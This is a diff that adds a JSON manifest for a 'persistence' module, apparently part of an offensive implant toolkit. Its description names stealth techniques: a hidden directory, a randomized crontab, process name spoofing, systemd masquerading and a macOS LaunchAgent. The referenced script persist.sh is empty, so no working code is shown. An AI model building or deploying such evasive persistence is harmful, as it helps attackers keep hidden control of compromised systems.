@@ -1,0 +1,18 @@
+{
+  "name": "persistence",
+  "version": "2.0.0",
+  "platform": "all",
+  "arch": "any",
+  "description": "Evasive multi-method persistence \u2014 hidden directory, randomized crontab, process name spoofing, systemd masquerading, LaunchAgent",
+  "type": "sh",
+  "commands": [
+    "persist_install",
+    "persist_remove",
+    "persist_status"
+  ],
+  "files": {
+    "persist.sh": ""
+  },
+  "author": "ruby570bocadito",
+  "evasive": true
+}
